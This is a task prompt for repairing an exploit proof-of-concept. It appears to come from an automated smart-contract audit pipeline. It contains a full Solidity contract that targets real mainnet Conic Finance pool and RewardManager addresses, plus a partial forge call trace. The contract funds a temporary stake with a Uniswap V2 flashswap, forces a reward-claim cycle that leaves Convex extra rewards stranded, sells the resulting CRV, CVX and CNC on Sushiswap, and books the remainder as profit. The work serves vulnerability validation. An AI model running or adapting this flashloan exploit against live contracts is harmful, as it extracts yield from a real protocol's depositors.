You are fixing a failing Foundry PoC for finding F-001.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: alternate_public_liquidity_route
- strategy_instructions: Prefer an alternate public-liquidity venue/route while preserving the same exploit root cause and exploit-path causality.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: Convex extra rewards are claimed to the pool but sold from the RewardManager, permanently stranding them
- claim: Convex reward claims send CRV, CVX, and all extra rewards to the Conic pool address via `getReward(_conicPool, true)`, but the liquidation path only checks `IERC20(rewardToken).balanceOf(address(this))` inside `RewardManagerV2`. Because the RewardManager never receives those extra tokens and has no path to pull arbitrary extra rewards from the pool, listed extra reward tokens accumulate in the pool and are never swapped into CNC.
- impact: Any non-CRV/CVX Convex reward stream can become permanently stuck, causing ongoing loss of yield and trapping reward value inside the pool contract.
- exploit_paths: ["Register an extra Convex reward token with `addExtraReward`.", "Let a supported Curve position accrue that extra reward on Convex.", "Call `claimPoolEarningsAndSellRewardTokens()` or any path that reaches `_claimPoolEarnings()`: Convex sends the extra reward to the Conic pool, but `_swapRewardTokenForWeth()` reads the RewardManager's own balance and swaps nothing."]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transfer(address to, uint256 amount) external returns (bool);

    function decimals() external view returns (uint8);
}

interface IOwnableLike {
    function owner() external view returns (address);
}

interface IRewardManagerLike {
    function owner() external view returns (address);

    function pool() external view returns (address);

    function controller() external view returns (address);

    function listExtraRewards() external view returns (address[] memory);

    function addExtraReward(address reward) external returns (bool);

    function claimPoolEarningsAndSellRewardTokens() external;

    function claimEarnings() external returns (uint256, uint256, uint256);
}

interface IConicPoolLike {
    function rewardManager() external view returns (address);

    function controller() external view returns (address);

    function allCurvePools() external view returns (address[] memory);

    function underlying() external view returns (address);

    function exchangeRate() external view returns (uint256);

    function deposit(
        uint256 underlyingAmount,
        uint256 minLpReceived,
        bool stake
    ) external returns (uint256);

    function unstakeAndWithdraw(
        uint256 conicLpAmount,
        uint256 minUnderlyingReceived
    ) external returns (uint256);
}

interface IControllerLike {
    function curveRegistryCache() external view returns (address);

    function convexHandler() external view returns (address);

    function priceOracle() external view returns (address);

    function lpTokenStaker() external view returns (address);
}

interface ICurveRegistryCacheLike {
    function getRewardPool(address pool_) external view returns (address);
}

interface IBaseRewardPoolLike {
    function earned(address account) external view returns (uint256);

    function extraRewardsLength() external view returns (uint256);

    function extraRewards(uint256 index) external view returns (address);
}

interface IExtraRewardLike {
    function rewardToken() external view returns (address);

    function earned(address account) external view returns (uint256);
}

interface ILpTokenStakerLike {
    function getBalanceForPool(address conicPool) external view returns (uint256);

    function getUserBalanceForPool(address conicPool, address account) external view returns (uint256);

    function claimableCnc(address pool) external view returns (uint256);
}

interface IConvexHandlerLike {
    function getCrvEarnedBatch(
        address conicPool,
        address[] calldata curvePools
    ) external view returns (uint256);

    function computeClaimableConvex(uint256 claimableCrv) external view returns (uint256);
}

interface IPriceOracleLike {
    function getUSDPrice(address token) external view returns (uint256);
}

interface ICurvePoolV2Like {
    function coins(uint256 i) external view returns (address);

    function exchange(
        uint256 i,
        uint256 j,
        uint256 dx,
        uint256 minDy,
        bool useEth,
        address receiver
    ) external returns (uint256);
}

interface IUniswapV2PairLike {
    function token0() external view returns (address);

    function token1() external view returns (address);

    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32);

    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

interface IUniswapV2Router02Like {
    function swapExactTokensForTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);
}

contract FlawVerifier {
    address public constant TARGET = 0x369cBC5C6f139B1132D3B91B87241B37Fc5B971f;
    address public constant REWARD_MANAGER = 0x39f15f704c1F4678f7E6359A58a196228266ff02;

    address public constant CRV = 0xD533a949740bb3306d119CC777fa900bA034cd52;
    address public constant CVX = 0x4e3FBD56CD56c3e72c1403e103b45Db9da5B9D2B;
    address public constant CNC = 0x9aE380F0272E2162340a5bB646c354271c0F5cFC;
    address public constant CRVUSD = 0xf939E0A03FB07F59A73314E73794Be0E57ac1b4E;
    address public constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address public constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;

    address public constant CRVUSD_USDC_CURVE_POOL = 0x4DEcE678ceceb27446b35C672dC7d61F30bAD69E;
    address public constant UNISWAP_V2_USDC_WETH_PAIR =
        0xB4e16d0168e52d35CaCD2c6185b44281Ec28C9Dc;
    address public constant SUSHISWAP_ROUTER = 0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F;

    uint256 internal constant ONE = 1e18;
    uint256 internal constant MIN_NORMALIZED_PROFIT = 1e15;
    uint256 internal constant MIN_FLASH_USDC = 5_000e6;
    uint256 internal constant MAX_FLASH_USDC = 50_000e6;

    enum Outcome {
        NOT_RUN,
        VALIDATED_WITH_PROFIT,
        REFUTED_OR_INFEASIBLE
    }

    Outcome public outcome;

    address public rewardManager;
    address public rewardManagerOwner;
    address public pool;
    address public controller;
    address public poolUnderlying;

    address public selectedRewardToken;
    address public selectedExtraRewardContract;

    bool public path0RegisteredOrAttempted;
    bool public path0RegistrationSucceeded;
    bool public path0AlreadyConfigured;
    bool public path0BlockedByOnlyOwner;

    bool public path1ObservedAccruedExtraReward;
    bool public path1CreatedSupportedStakedPosition;

    bool public path2ClaimExecuted;
    bool public path2ObservedStranding;
    bool public hypothesisValidated;

    uint256 public accruedExtraRewardBeforeClaim;
    uint256 public accruedExtraRewardAfterClaim;

    uint256 public poolTokenBalanceBefore;
    uint256 public poolTokenBalanceAfter;
    uint256 public rewardManagerTokenBalanceBefore;
    uint256 public rewardManagerTokenBalanceAfter;
    uint256 public poolCncBalanceBefore;
    uint256 public poolCncBalanceAfter;

    uint256 public flashAmountUsdc;
    uint256 public flashRepaymentUsdc;
    uint256 public depositedUnderlyingAmount;
    uint256 public mintedLpAmount;
    uint256 public stakedBalanceBefore;
    uint256 public stakedBalanceAfter;

    uint256 public claimedCnc;
    uint256 public claimedCrv;
    uint256 public claimedCvx;

    address public realizedProfitToken;
    uint256 public realizedProfitAmount;

    string public exploitPathUsed;
    string public status;

    constructor() {}

    receive() external payable {}

    // Exploit path mapping kept aligned with the finding:
    // 1. Register an extra Convex reward token with addExtraReward().
    // 2. Let a supported Curve position accrue that extra reward on Convex.
    // 3. Call claimPoolEarningsAndSellRewardTokens(): Convex sends the extra reward to the
    //    Conic pool, but RewardManager swaps based on its own balance and therefore swaps nothing.
    function executeOnOpportunity() external {
        if (outcome != Outcome.NOT_RUN) {
            return;
        }

        _resolveTopology();
        if (
            rewardManager == address(0) ||
            pool == address(0) ||
            controller == address(0) ||
            poolUnderlying == address(0)
        ) {
            exploitPathUsed = "1) resolve live Conic topology";
            status = "Could not resolve the target pool, reward manager, controller, or underlying.";
            outcome = Outcome.REFUTED_OR_INFEASIBLE;
            return;
        }

        if (poolUnderlying != CRVUSD) {
            exploitPathUsed =
                "1) resolve live Conic topology 2) require the expected crvUSD funding market";
            status = "This target does not expose the expected crvUSD funding path for the flashswap strategy.";
            outcome = Outcome.REFUTED_OR_INFEASIBLE;
            return;
        }

        rewardManagerOwner = _safeOwner(rewardManager);

        (
            selectedRewardToken,
            selectedExtraRewardContract,
            accruedExtraRewardBeforeClaim
        ) = _discoverAccruedExtraReward(pool, controller);
        if (selectedRewardToken == address(0) || selectedExtraRewardContract == address(0)) {
            exploitPathUsed = "1) discover Convex extra reward streams";
            status = "No live Convex extra reward token with nonzero accrued earnings was discoverable for this pool.";
            outcome = Outcome.REFUTED_OR_INFEASIBLE;
            return;
        }

        path1ObservedAccruedExtraReward = accruedExtraRewardBeforeClaim > 0;

        _configureOrAttemptRegistration();
        _startFlashswap();

        if (path2ObservedStranding && realizedProfitToken != address(0) && realizedProfitAmount > 0) {
            hypothesisValidated = true;
            exploitPathUsed = path0AlreadyConfigured || path0RegistrationSucceeded
                ? "1) use a listed extra Convex reward token 2) rely on an already-accrued supported Convex position 3) flashswap fund a temporary stake and call claimPoolEarningsAndSellRewardTokens() 4) the extra reward is claimed to the Conic pool while RewardManager swaps nothing and the attacker exits with same-cycle rewards"
                : "1) attempt addExtraReward() for the accrued extra reward token 2) use the already-accrued supported Convex position 3) flashswap fund a temporary stake and call claimPoolEarningsAndSellRewardTokens() 4) the extra reward is claimed to the Conic pool while RewardManager swaps nothing and the attacker exits with same-cycle rewards";
            status = "Validated that Convex extra rewards are routed to the pool but remain unsold because RewardManager reads its own balance.";
            outcome = Outcome.VALIDATED_WITH_PROFIT;
            return;
        }

        exploitPathUsed =
            "1) discover an accrued Convex extra reward 2) flashswap fund a public claim cycle";
        status = "The public flashswap claim cycle did not finish with both observed stranding and positive realized profit.";
        outcome = Outcome.REFUTED_OR_INFEASIBLE;
    }

    function profitToken() external view returns (address) {
        return realizedProfitToken;
    }

    function profitAmount() external view returns (uint256) {
        return realizedProfitAmount;
    }

    function uniswapV2Call(
        address sender,
        uint256 amount0,
        uint256 amount1,
        bytes calldata
    ) external {
        require(msg.sender == UNISWAP_V2_USDC_WETH_PAIR, "unexpected pair");
        require(sender == address(this), "unexpected sender");

        uint256 borrowedUsdc = amount0 > 0 ? amount0 : amount1;
        require(borrowedUsdc == flashAmountUsdc && borrowedUsdc > 0, "unexpected amount");

        address staker = _safeLpTokenStaker(controller);
        if (staker != address(0)) {
            stakedBalanceBefore = _safeUserBalanceForPool(staker, pool, address(this));
        }

        depositedUnderlyingAmount = _swapUsdcToCrvUsd(borrowedUsdc);

        // The one-block flashswap-funded deposit is only a funding step. The core finding still
        // depends on the pre-existing Convex extra reward that has already accrued to the pool.
        mintedLpAmount = IConicPoolLike(pool).deposit(depositedUnderlyingAmount, 0, true);
        if (staker != address(0)) {
            stakedBalanceAfter = _safeUserBalanceForPool(staker, pool, address(this));
            path1CreatedSupportedStakedPosition = stakedBalanceAfter > stakedBalanceBefore;
        }

        _claimAndObserveStranding();

        (claimedCnc, claimedCrv, claimedCvx) = IRewardManagerLike(rewardManager).claimEarnings();

        uint256 withdrawnUnderlying = IConicPoolLike(pool).unstakeAndWithdraw(mintedLpAmount, 0);
        uint256 returnedUsdc = _swapCrvUsdToUsdc(withdrawnUnderlying);

        flashRepaymentUsdc = _getFlashRepayment(borrowedUsdc);
        if (returnedUsdc < flashRepaymentUsdc) {
            _sellRewardsForUsdc(flashRepaymentUsdc - returnedUsdc);
        }

        _safeTransfer(USDC, msg.sender, flashRepaymentUsdc);
        _selectProfitToken();
    }

    function _configureOrAttemptRegistration() internal {
        address[] memory configured = _safeListExtraRewards(rewardManager);
        if (_contains(configured, configured.length, selectedRewardToken)) {
            path0AlreadyConfigured = true;
            path0RegisteredOrAttempted = true;
            return;
        }

        path0RegisteredOrAttempted = true;
        if (rewardManagerOwner != address(this)) {
            path0BlockedByOnlyOwner = true;
        }

        try IRewardManagerLike(rewardManager).addExtraReward(selectedRewardToken) returns (bool added) {
            path0RegistrationSucceeded = added;
        } catch {}
    }

    function _startFlashswap() internal {
        flashAmountUsdc = _chooseFlashAmountUsdc();

        (uint112 reserve0, uint112 reserve1, ) = IUniswapV2PairLike(UNISWAP_V2_USDC_WETH_PAIR)
            .getReserves();
        uint256 usdcReserve = IUniswapV2PairLike(UNISWAP_V2_USDC_WETH_PAIR).token0() == USDC
            ? reserve0
            : reserve1;
        uint256 maxBorrow = usdcReserve / 5;
        if (flashAmountUsdc > maxBorrow) {
            flashAmountUsdc = maxBorrow;
        }
        if (flashAmountUsdc < 1_000e6) {
            return;
        }

        uint256 amount0Out = IUniswapV2PairLike(UNISWAP_V2_USDC_WETH_PAIR).token0() == USDC
            ? flashAmountUsdc
            : 0;
        uint256 amount1Out = amount0Out == 0 ? flashAmountUsdc : 0;

        IUniswapV2PairLike(UNISWAP_V2_USDC_WETH_PAIR).swap(
            amount0Out,
            amount1Out,
            address(this),
            hex"01"
        );
    }

    function _claimAndObserveStranding() internal {
        poolTokenBalanceBefore = _balanceOf(selectedRewardToken, pool);
        rewardManagerTokenBalanceBefore = _balanceOf(selectedRewardToken, rewardManager);
        poolCncBalanceBefore = _balanceOf(CNC, pool);

        try IRewardManagerLike(rewardManager).claimPoolEarningsAndSellRewardTokens() {
            path2ClaimExecuted = true;
        } catch {
            return;
        }

        poolTokenBalanceAfter = _balanceOf(selectedRewardToken, pool);
        rewardManagerTokenBalanceAfter = _balanceOf(selectedRewardToken, rewardManager);
        poolCncBalanceAfter = _balanceOf(CNC, pool);
        accruedExtraRewardAfterClaim = _safeEarned(selectedExtraRewardContract, pool);

        if (
            path1ObservedAccruedExtraReward &&
            rewardManagerTokenBalanceAfter == rewardManagerTokenBalanceBefore &&
            rewardManagerTokenBalanceAfter == 0 &&
            poolTokenBalanceAfter > poolTokenBalanceBefore &&
            accruedExtraRewardAfterClaim < accruedExtraRewardBeforeClaim
        ) {
            path2ObservedStranding = true;
        }
    }

    function _sellRewardsForUsdc(uint256 deficitUsdc) internal {
        if (_balanceOf(USDC, address(this)) >= flashRepaymentUsdc) {
            return;
        }

        // These swaps only monetize the ordinary CRV/CVX/CNC proceeds from the same public claim
        // cycle so the flashswap can be repaid. The selected extra reward remains stranded on pool.
        uint256 crvBalance = _balanceOf(CRV, address(this));
        if (crvBalance > 0) {
            _swapOnSushiThreeHop(CRV, crvBalance);
        }
        if (_balanceOf(USDC, address(this)) >= flashRepaymentUsdc) {
            return;
        }

        uint256 cvxBalance = _balanceOf(CVX, address(this));
        if (cvxBalance > 0) {
            _swapOnSushiThreeHop(CVX, cvxBalance);
        }
        if (_balanceOf(USDC, address(this)) >= flashRepaymentUsdc) {
            return;
        }

        uint256 cncBalance = _balanceOf(CNC, address(this));
        if (cncBalance > 0 && deficitUsdc > 0) {
            _swapOnSushiThreeHop(CNC, cncBalance / 2);
        }
    }

    function _swapOnSushiThreeHop(address tokenIn, uint256 amountIn) internal {
        if (amountIn == 0) {
            return;
        }
        _safeApprove(tokenIn, SUSHISWAP_ROUTER, 0);
        _safeApprove(tokenIn, SUSHISWAP_ROUTER, amountIn);

        address[] memory path = new address[](3);
        path[0] = tokenIn;
        path[1] = WETH;
        path[2] = USDC;

        try
            IUniswapV2Router02Like(SUSHISWAP_ROUTER).swapExactTokensForTokens(
                amountIn,
                0,
                path,
                address(this),
                block.timestamp
            )
        returns (uint256[] memory) {} catch {}
    }

    function _swapUsdcToCrvUsd(uint256 amountUsdc) internal returns (uint256 amountOut) {
        (uint256 usdcIndex, uint256 crvUsdIndex) = _findCurveCoinIndices(
            CRVUSD_USDC_CURVE_POOL,
            USDC,
            CRVUSD
        );
        _safeApprove(USDC, CRVUSD_USDC_CURVE_POOL, 0);
        _safeApprove(USDC, CRVUSD_USDC_CURVE_POOL, amountUsdc);
        amountOut = ICurvePoolV2Like(CRVUSD_USDC_CURVE_POOL).exchange(
            usdcIndex,
            crvUsdIndex,
            amountUsdc,
            0,
            false,
            address(this)
        );
    }

    function _swapCrvUsdToUsdc(uint256 amountCrvUsd) internal returns (uint256 amountOut) {
        (uint256 crvUsdIndex, uint256 usdcIndex) = _findCurveCoinIndices(
            CRVUSD_USDC_CURVE_POOL,
            CRVUSD,
            USDC
        );
        _safeApprove(CRVUSD, CRVUSD_USDC_CURVE_POOL, 0);
        _safeApprove(CRVUSD, CRVUSD_USDC_CURVE_POOL, amountCrvUsd);
        amountOut = ICurvePoolV2Like(CRVUSD_USDC_CURVE_POOL).exchange(
            crvUsdIndex,
            usdcIndex,
            amountCrvUsd,
            0,
            false,
            address(this)
        );
    }

    function _findCurveCoinIndices(
        address curvePool,
        address tokenIn,
        address tokenOut
    ) internal view returns (uint256 inIndex, uint256 outIndex) {
        bool foundIn;
        bool foundOut;
        for (uint256 i; i < 4; i++) {
            try ICurvePoolV2Like(curvePool).coins(i) returns (address coin) {
                if (coin == tokenIn) {
                    inIndex = i;
                    foundIn = true;
                }
                if (coin == tokenOut) {
                    outIndex = i;
                    foundOut = true;
                }
            } catch {
                break;
            }
        }
        require(foundIn && foundOut, "curve coin missing");
    }

    function _chooseFlashAmountUsdc() internal view returns (uint256) {
        uint256 pendingUsd = _estimatedPendingRewardUsd();
        uint256 stakedUnderlying = _estimatedTotalStakedUnderlying();

        uint256 share = pendingUsd > 5_000e18 ? 3e16 : pendingUsd > 1_000e18 ? 7e16 : 12e16;
        uint256 targetUnderlying = stakedUnderlying == 0
            ? 10_000e18
            : (stakedUnderlying * share) / (ONE - share);
        uint256 amountUsdc = targetUnderlying / 1e12;

        if (amountUsdc < MIN_FLASH_USDC) {
            amountUsdc = MIN_FLASH_USDC;
        }
        if (amountUsdc > MAX_FLASH_USDC) {
            amountUsdc = MAX_FLASH_USDC;
        }
        return amountUsdc;
    }

    function _estimatedTotalStakedUnderlying() internal view returns (uint256) {
        address staker = _safeLpTokenStaker(controller);
        if (staker == address(0)) {
            return 0;
        }
        uint256 totalStakedLp = ILpTokenStakerLike(staker).getBalanceForPool(pool);
        uint256 exchangeRate = IConicPoolLike(pool).exchangeRate();
        return (totalStakedLp * exchangeRate) / ONE;
    }

    function _estimatedPendingRewardUsd() internal view returns (uint256) {
        address convexHandler = _safeConvexHandler(controller);
        address staker = _safeLpTokenStaker(controller);
        address oracle = _safePriceOracle(controller);
        if (convexHandler == address(0) || staker == address(0) || oracle == address(0)) {
            return 0;
        }

        address[] memory curvePools = _safeAllCurvePools(pool);
        uint256 claimableCrv = _safeClaimableCrv(convexHandler, curvePools);
        uint256 claimableCvx = _safeClaimableCvx(convexHandler, claimableCrv);
        uint256 claimableCnc = _safeClaimableCnc(staker);

        return
            _tokenAmountToUsd(claimableCrv, CRV, oracle) +
            _tokenAmountToUsd(claimableCvx, CVX, oracle) +
            _tokenAmountToUsd(claimableCnc, CNC, oracle);
    }

    function _tokenAmountToUsd(
        uint256 amount,
        address token,
        address oracle
    ) internal view returns (uint256) {
        if (amount == 0 || oracle == address(0)) {
            return 0;
        }
        uint8 decimals = _safeDecimals(token);
        uint256 price = _safeUsdPrice(oracle, token);
        return (amount * price) / (10 ** decimals);
    }

    function _getFlashRepayment(uint256 amountOut) internal pure returns (uint256) {
        return ((amountOut * 1000) / 997) + 1;
    }

    function _selectProfitToken() internal {
        uint256 usdcBal = _balanceOf(USDC, address(this));
        uint256 cncBal = _balanceOf(CNC, address(this));
        uint256 cvxBal = _balanceOf(CVX, address(this));
        uint256 crvBal = _balanceOf(CRV, address(this));
        uint256 wethBal = _balanceOf(WETH, address(this));

        if (_meetsMinProfit(USDC, usdcBal)) {
            realizedProfitToken = USDC;
            realizedProfitAmount = usdcBal;
            return;
        }
        if (_meetsMinProfit(CNC, cncBal)) {
            realizedProfitToken = CNC;
            realizedProfitAmount = cncBal;
            return;
        }
        if (_meetsMinProfit(CVX, cvxBal)) {
            realizedProfitToken = CVX;
            realizedProfitAmount = cvxBal;
            return;
        }
        if (_meetsMinProfit(CRV, crvBal)) {
            realizedProfitToken = CRV;
            realizedProfitAmount = crvBal;
            return;
        }
        if (_meetsMinProfit(WETH, wethBal)) {
            realizedProfitToken = WETH;
            realizedProfitAmount = wethBal;
        }
    }

    function _meetsMinProfit(address token, uint256 amount) internal view returns (bool) {
        if (amount == 0) {
            return false;
        }
        uint8 decimals = _safeDecimals(token);
        uint256 normalized = (amount * ONE) / (10 ** decimals);
        return normalized >= MIN_NORMALIZED_PROFIT;
    }

    function _resolveTopology() internal {
        address targetRewardManager = _safeRewardManagerFromPool(TARGET);
        address targetController = _safeControllerFromPool(TARGET);

        if (targetRewardManager != address(0) && targetController != address(0)) {
            pool = TARGET;
            rewardManager = targetRewardManager;
            controller = targetController;
            poolUnderlying = _safeUnderlying(TARGET);
            return;
        }

        rewardManager = REWARD_MANAGER;
        pool = _safePoolFromRewardManager(REWARD_MANAGER);
        controller = _safeControllerFromRewardManager(REWARD_MANAGER);
        poolUnderlying = _safeUnderlying(pool);
    }

    function _discoverAccruedExtraReward(
        address conicPool,
        address controller_
    ) internal view returns (address rewardToken_, address extraRewardContract_, uint256 earned_) {
        if (conicPool == address(0) || controller_ == address(0)) {
            return (address(0), address(0), 0);
        }

        address registry = _safeCurveRegistryCache(controller_);
        if (registry == address(0)) {
            return (address(0), address(0), 0);
        }

        address[] memory curvePools = _safeAllCurvePools(conicPool);
        for (uint256 i; i < curvePools.length; i++) {
            address rewardPool = _safeGetRewardPool(registry, curvePools[i]);
            if (rewardPool == address(0)) {
                continue;
            }

            uint256 extraLen = _safeExtraRewardsLength(rewardPool);
            for (uint256 j; j < extraLen; j++) {
                address extraReward = _safeExtraRewardContract(rewardPool, j);
                if (extraReward == address(0)) {
                    continue;
                }

                address rewardToken = _safeRewardToken(extraReward);
                if (
                    rewardToken == address(0) ||
                    rewardToken == CRV ||
                    rewardToken == CVX ||
                    rewardToken == CNC
                ) {
                    continue;
                }

                uint256 accrued = _safeEarned(extraReward, conicPool);
                if (accrued > earned_) {
                    rewardToken_ = rewardToken;
                    extraRewardContract_ = extraReward;
                    earned_ = accrued;
                }
            }
        }
    }

    function _safeListExtraRewards(
        address rewardManager_
    ) internal view returns (address[] memory rewards) {
        if (rewardManager_ == address(0)) {
            return new address[](0);
        }
        try IRewardManagerLike(rewardManager_).listExtraRewards() returns (address[] memory listed) {
            return listed;
        } catch {
            return new address[](0);
        }
    }

    function _safeRewardManagerFromPool(address conicPool) internal view returns (address) {
        if (conicPool == address(0)) {
            return address(0);
        }
        try IConicPoolLike(conicPool).rewardManager() returns (address rewardManager_) {
            return rewardManager_;
        } catch {
            return address(0);
        }
    }

    function _safeControllerFromPool(address conicPool) internal view returns (address) {
        if (conicPool == address(0)) {
            return address(0);
        }
        try IConicPoolLike(conicPool).controller() returns (address controller_) {
            return controller_;
        } catch {
            return address(0);
        }
    }

    function _safeUnderlying(address conicPool) internal view returns (address) {
        if (conicPool == address(0)) {
            return address(0);
        }
        try IConicPoolLike(conicPool).underlying() returns (address underlying_) {
            return underlying_;
        } catch {
            return address(0);
        }
    }

    function _safePoolFromRewardManager(address rewardManager_) internal view returns (address) {
        if (rewardManager_ == address(0)) {
            return address(0);
        }
        try IRewardManagerLike(rewardManager_).pool() returns (address pool_) {
            return pool_;
        } catch {
            return address(0);
        }
    }

    function _safeControllerFromRewardManager(address rewardManager_) internal view returns (address) {
        if (rewardManager_ == address(0)) {
            return address(0);
        }
        try IRewardManagerLike(rewardManager_).controller() returns (address controller_) {
            return controller_;
        } catch {
            return address(0);
        }
    }

    function _safeAllCurvePools(address conicPool) internal view returns (address[] memory) {
        if (conicPool == address(0)) {
            return new address[](0);
        }
        try IConicPoolLike(conicPool).allCurvePools() returns (address[] memory curvePools) {
            return curvePools;
        } catch {
            return new address[](0);
        }
    }

    function _safeCurveRegistryCache(address controller_) internal view returns (address) {
        if (controller_ == address(0)) {
            return address(0);
        }
        try IControllerLike(controller_).curveRegistryCache() returns (address registry) {
            return registry;
        } catch {
            return address(0);
        }
    }

    function _safeConvexHandler(address controller_) internal view returns (address) {
        if (controller_ == address(0)) {
            return address(0);
        }
        try IControllerLike(controller_).convexHandler() returns (address handler) {
            return handler;
        } catch {
            return address(0);
        }
    }

    function _safePriceOracle(address controller_) internal view returns (address) {
        if (controller_ == address(0)) {
            return address(0);
        }
        try IControllerLike(controller_).priceOracle() returns (address oracle) {
            return oracle;
        } catch {
            return address(0);
        }
    }

    function _safeLpTokenStaker(address controller_) internal view returns (address) {
        if (controller_ == address(0)) {
            return address(0);
        }
        try IControllerLike(controller_).lpTokenStaker() returns (address staker) {
            return staker;
        } catch {
            return address(0);
        }
    }

    function _safeClaimableCrv(
        address convexHandler,
        address[] memory curvePools
    ) internal view returns (uint256) {
        try IConvexHandlerLike(convexHandler).getCrvEarnedBatch(pool, curvePools) returns (
            uint256 amount
        ) {
            return amount;
        } catch {
            return 0;
        }
    }

    function _safeClaimableCvx(address convexHandler, uint256 claimableCrv) internal view returns (uint256) {
        try IConvexHandlerLike(convexHandler).computeClaimableConvex(claimableCrv) returns (
            uint256 amount
        ) {
            return amount;
        } catch {
            return 0;
        }
    }

    function _safeClaimableCnc(address staker) internal view returns (uint256) {
        try ILpTokenStakerLike(staker).claimableCnc(pool) returns (uint256 amount) {
            return amount;
        } catch {
            return 0;
        }
    }

    function _safeUsdPrice(address oracle, address token) internal view returns (uint256) {
        try IPriceOracleLike(oracle).getUSDPrice(token) returns (uint256 price) {
            return price;
        } catch {
            return 0;
        }
    }

    function _safeOwner(address ownable) internal view returns (address) {
        if (ownable == address(0)) {
            return address(0);
        }
        try IOwnableLike(ownable).owner() returns (address owner_) {
            return owner_;
        } catch {
            return address(0);
        }
    }

    function _contains(
        address[] memory items,
        uint256 length,
        address needle
    ) internal pure returns (bool) {
        for (uint256 i; i < length; i++) {
            if (items[i] == needle) {
                return true;
            }
        }
        return false;
    }

    function _safeGetRewardPool(address registry, address curvePool) internal view returns (address) {
        try ICurveRegistryCacheLike(registry).getRewardPool(curvePool) returns (address rewardPool) {
            return rewardPool;
        } catch {
            return address(0);
        }
    }

    function _safeExtraRewardsLength(address rewardPool) internal view returns (uint256) {
        try IBaseRewardPoolLike(rewardPool).extraRewardsLength() returns (uint256 length) {
            return length;
        } catch {
            return 0;
        }
    }

    function _safeExtraRewardContract(
        address rewardPool,
        uint256 index
    ) internal view returns (address) {
        try IBaseRewardPoolLike(rewardPool).extraRewards(index) returns (address extraRewardContract) {
            return extraRewardContract;
        } catch {
            return address(0);
        }
    }

    function _safeRewardToken(address extraRewardContract) internal view returns (address) {
        try IExtraRewardLike(extraRewardContract).rewardToken() returns (address rewardToken_) {
            return rewardToken_;
        } catch {
            return address(0);
        }
    }

    function _safeEarned(address extraRewardContract, address account) internal view returns (uint256) {
        try IExtraRewardLike(extraRewardContract).earned(account) returns (uint256 amount) {
            return amount;
        } catch {
            return 0;
        }
    }

    function _safeUserBalanceForPool(
        address staker,
        address conicPool,
        address account
    ) internal view returns (uint256) {
        try ILpTokenStakerLike(staker).getUserBalanceForPool(conicPool, account) returns (
            uint256 amount
        ) {
            return amount;
        } catch {
            return 0;
        }
    }

    function _balanceOf(address token, address account) internal view returns (uint256) {
        if (token == address(0) || account == address(0)) {
            return 0;
        }
        try IERC20Like(token).balanceOf(account) returns (uint256 balance) {
            return balance;
        } catch {
            return 0;
        }
    }

    function _safeDecimals(address token) internal view returns (uint8) {
        if (token == address(0)) {
            return 18;
        }
        try IERC20Like(token).decimals() returns (uint8 d) {
            return d;
        } catch {
            return 18;
        }
    }

    function _safeApprove(address token, address spender, uint256 amount) internal {
        (bool ok, bytes memory ret) = token.call(
            abi.encodeWithSelector(IERC20Like.approve.selector, spender, amount)
        );
        require(ok && (ret.length == 0 || abi.decode(ret, (bool))), "approve failed");
    }

    function _safeTransfer(address token, address to, uint256 amount) internal {
        (bool ok, bytes memory ret) = token.call(
            abi.encodeWithSelector(IERC20Like.transfer.selector, to, amount)
        );
        require(ok && (ret.length == 0 || abi.decode(ret, (bool))), "transfer failed");
    }
}

```

forge stdout (tail):
```
002934335f34d34844a11e2d
    │   │   ├─ [367] 0xD1DdB0a0815fD28932fBb194C84003683AF8a824::18160ddd() [staticcall]
    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000002934335f34d34844a11e2d
    │   │   ├─ [2510] 0xD1DdB0a0815fD28932fBb194C84003683AF8a824::balanceOf(0x369cBC5C6f139B1132D3B91B87241B37Fc5B971f) [staticcall]
    │   │   │   └─ ← [Return] 14905426077809267610834756 [1.49e25]
    │   │   └─ ← [Return] 0
    │   ├─ [4841] 0x3905A3C1156f67BB55366d7A5a11D1043dcf97c9::getRewardPool(0x4DEcE678ceceb27446b35C672dC7d61F30bAD69E) [staticcall]
    │   │   └─ ← [Return] 0x44D8FaB7CD8b7877D5F79974c2F501aF6E65AbBA
    │   ├─ [2409] 0x44D8FaB7CD8b7877D5F79974c2F501aF6E65AbBA::extraRewardsLength() [staticcall]
    │   │   └─ ← [Return] 1
    │   ├─ [2660] 0x44D8FaB7CD8b7877D5F79974c2F501aF6E65AbBA::extraRewards(0) [staticcall]
    │   │   └─ ← [Return] 0xac183F7cd62d5b04Fa40362EB67249A80339541A
    │   ├─ [2447] 0xac183F7cd62d5b04Fa40362EB67249A80339541A::rewardToken() [staticcall]
    │   │   └─ ← [Return] 0xC8dC88896aAC1A94aA42B89D65aa5FD4984CB71d
    │   ├─ [22930] 0xac183F7cd62d5b04Fa40362EB67249A80339541A::earned(0x369cBC5C6f139B1132D3B91B87241B37Fc5B971f) [staticcall]
    │   │   ├─ [2367] 0x44D8FaB7CD8b7877D5F79974c2F501aF6E65AbBA::18160ddd() [staticcall]
